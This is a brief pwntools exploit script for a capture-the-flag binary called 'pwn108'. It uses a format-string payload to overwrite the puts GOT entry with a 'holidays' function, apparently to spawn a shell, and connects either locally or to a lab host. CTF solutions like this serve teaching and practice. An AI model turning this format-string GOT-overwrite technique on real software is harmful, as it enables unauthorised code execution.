#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF("./pwn108", checksec=False)

if args.REMOTE:
    p = remote("10.10.142.177", 9008)
else:
    p = process(binary.path)

payload = fmtstr_payload(10, {binary.got.puts : binary.sym.holidays})
p.sendlineafter(b"=[Your name]: ", b"foo")
p.sendlineafter(b"=[Your Reg No]: ", payload)
null = payload.find(b"\x00")
p.recvuntil(payload[null-3:null])
p.interactive()
